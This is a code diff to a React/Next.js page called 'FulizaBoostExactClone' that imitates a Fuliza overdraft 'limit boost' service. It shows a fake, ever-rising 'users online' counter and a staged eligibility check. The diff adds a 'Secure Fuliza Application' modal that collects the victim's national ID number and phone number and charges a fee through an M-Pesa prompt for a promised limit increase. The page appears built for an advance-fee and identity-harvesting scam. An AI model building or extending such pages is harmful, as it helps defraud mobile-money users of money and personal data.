@@ -1,5 +1,5 @@
 'use client';
-// src/app/page.tsx - Complete Code with Improved Select Limit Screen
+// src/app/page.tsx - Complete Code with Secure Fuliza Application Modal
 
 import React, { useState, useEffect } from 'react';
 
@@ -24,9 +24,14 @@ const limits = [
 export default function FulizaBoostExactClone() {
   const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select' | 'final'>('input');
   const [usersOnline, setUsersOnline] = useState(137);
-  const [phoneNumber, setPhoneNumber] = useState('0759211545'); // Your test number pre-filled
+  const [phoneNumber, setPhoneNumber] = useState('0759211545'); // Your test number
   const [enteredPhone, setEnteredPhone] = useState('');
   const [loadingMsg, setLoadingMsg] = useState('');
+
+  // New states for Secure Modal
+  const [showSecureModal, setShowSecureModal] = useState(false);
+  const [selectedLimit, setSelectedLimit] = useState<{ amount: number; fee: number } | null>(null);
+  const [idNumber, setIdNumber] = useState('');
 
   const loadingMessages = [
     "Connecting...",
@@ -36,7 +41,6 @@ export default function FulizaBoostExactClone() {
     "Calculating eligibility..."
   ];
 
-  // Live users online counter
   useEffect(() => {
     const interval = setInterval(() => {
       setUsersOnline(prev => prev + Math.floor(Math.random() * 3) + 1);
@@ -67,7 +71,23 @@ export default function FulizaBoostExactClone() {
 
   const handleProceedToUpgrade = () => setStep('select');
 
-  const handleSelectLimit = () => setStep('final');
+  const handleSelectLimit = (limit: { amount: number; fee: number }) => {
+    setSelectedLimit(limit);
+    setShowSecureModal(true);
+  };
+
+  const handlePay = () => {
+    if (!idNumber.trim()) {
+      alert("Please enter your ID Number (demo only)");
+      return;
+    }
+    setShowSecureModal(false);
+    setStep('final');
+  };
+
+  const closeModal = () => {
+    setShowSecureModal(false);
+  };
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-white flex items-center justify-center px-4 py-8 font-sans">
@@ -81,7 +101,7 @@ export default function FulizaBoostExactClone() {
 
         <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">
 
-          {/* INPUT SCREEN */}
+          {/* Input Screen */}
           {step === 'input' && (
             <>
               <div className="pt-10 pb-6 flex flex-col items-center">
@@ -124,7 +144,7 @@ export default function FulizaBoostExactClone() {
             </>
           )}
 
-          {/* LOADING SCREEN */}
+          {/* Loading Screen */}
           {step === 'loading' && (
             <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
               <div className="bg-white rounded-3xl p-12 w-[320px] text-center shadow-2xl">
@@ -135,7 +155,7 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
-          {/* CONGRATULATIONS SCREEN */}
+          {/* Congratulations Screen */}
           {step === 'congrats' && (
             <div className="px-8 py-12 text-center">
               <div className="mx-auto w-20 h-20 bg-emerald-600 rounded-full flex items-center justify-center mb-6">
@@ -155,16 +175,14 @@ export default function FulizaBoostExactClone() {
             </div>
           )}
 
-          {/* SELECT LIMIT SCREEN - MATCHING YOUR SCREENSHOT */}
+          {/* Select Limit Screen */}
           {step === 'select' && (
             <div className="px-4 py-6">
-              {/* Header */}
               <div className="text-center mb-6">
                 <h1 className="text-3xl font-bold text-gray-900">FulizaBoost</h1>
                 <p className="text-sm text-gray-500 mt-1">Instant Limit Increase • Same Day Access</p>
               </div>
 
-              {/* Live Activity */}
               <div className="bg-emerald-50 border border-emerald-100 rounded-2xl p-4 mb-8 mx-2">
                 <div className="flex items-center gap-2 text-xs font-medium text-emerald-600">
                   <span>🔄</span> LIVE ACTIVITY
@@ -174,17 +192,15 @@ export default function FulizaBoostExactClone() {
                 </p>
               </div>
 
-              {/* Title */}
               <h2 className="text-xl font-semibold text-center mb-6 text-gray-900 px-2">
                 Select Your New Approved Limit
               </h2>
 
-              {/* Limit Cards */}
               <div className="grid grid-cols-2 gap-3 px-2">
                 {limits.map((opt) => (
                   <button
                     key={opt.amount}
-                    onClick={handleSelectLimit}
+                    onClick={() => handleSelectLimit(opt)}
                     className="bg-white border border-gray-200 hover:border-emerald-500 hover:shadow-sm transition-all rounded-2xl p-5 text-center active:scale-[0.97]"
                   >
                     <div className="text-[21px] font-bold text-emerald-700">
@@ -197,21 +213,16 @@ export default function FulizaBoostExactClone() {
                 ))}
               </div>
 
-              {/* Big Green Button */}
               <button
-                onClick={handleSelectLimit}
-                className="mt-10 mx-2 w-full bg-emerald-600 hover:bg-emerald-700 active:bg-emerald-800 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2 shadow"
+                onClick={() => {}} // Disabled button for visual only
+                className="mt-10 mx-2 w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2 shadow cursor-not-allowed opacity-75"
               >
                 ⚡ SELECT A LIMIT
               </button>
-
-              <p className="text-center text-xs text-gray-500 mt-6">
-                SELECT A LIMIT • Secure Fuliza Application
-              </p>
             </div>
           )}
 
-          {/* FINAL KSH 0 SCREEN */}
+          {/* Final Ksh 0 Screen */}
           {step === 'final' && (
             <div className="px-8 py-16 text-center">
               <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
@@ -221,6 +232,68 @@ export default function FulizaBoostExactClone() {
           )}
         </div>
       </div>
+
+      {/* SECURE FULIZA APPLICATION MODAL */}
+      {showSecureModal && selectedLimit && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
+          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
+            {/* Green Header */}
+            <div className="bg-emerald-600 text-white p-5 text-center">
+              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
+              <p className="text-lg font-semibold mt-1">
+                Limit will be boosted to {formatKsh(selectedLimit.amount)}
+              </p>
+            </div>
+
+            {/* Content */}
+            <div className="p-6">
+              <div className="bg-emerald-50 border border-emerald-100 rounded-xl p-4 text-sm text-gray-700 mb-6">
+                Enter your Safaricom number for VERIFICATION! and to receive M-Pesa payment prompt. 
+                Once payment is confirmed your Fuliza boost request will begin processing.
+              </div>
+
+              {/* ID Number */}
+              <div className="mb-5">
+                <p className="text-xs font-medium text-gray-500 mb-1.5">ID Number</p>
+                <input
+                  type="text"
+                  value={idNumber}
+                  onChange={(e) => setIdNumber(e.target.value)}
+                  placeholder="Enter ID Number"
+                  className="w-full border border-gray-300 rounded-xl px-4 py-3 text-base outline-none focus:border-emerald-600"
+                />
+              </div>
+
+              {/* Phone Number (Pre-filled) */}
+              <div>
+                <p className="text-xs font-medium text-gray-500 mb-1.5">Phone Number</p>
+                <input
+                  type="tel"
+                  value={enteredPhone}
+                  readOnly
+                  className="w-full border border-gray-300 bg-gray-50 rounded-xl px-4 py-3 text-base outline-none"
+                />
+              </div>
+            </div>
+
+            {/* Action Buttons */}
+            <div className="flex border-t border-gray-100">
+              <button
+                onClick={closeModal}
+                className="flex-1 py-4 text-gray-600 font-semibold border-r border-gray-100 hover:bg-gray-50 transition"
+              >
+                Cancel
+              </button>
+              <button
+                onClick={handlePay}
+                className="flex-1 py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold transition"
+              >
+                Pay Ksh {selectedLimit.fee}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
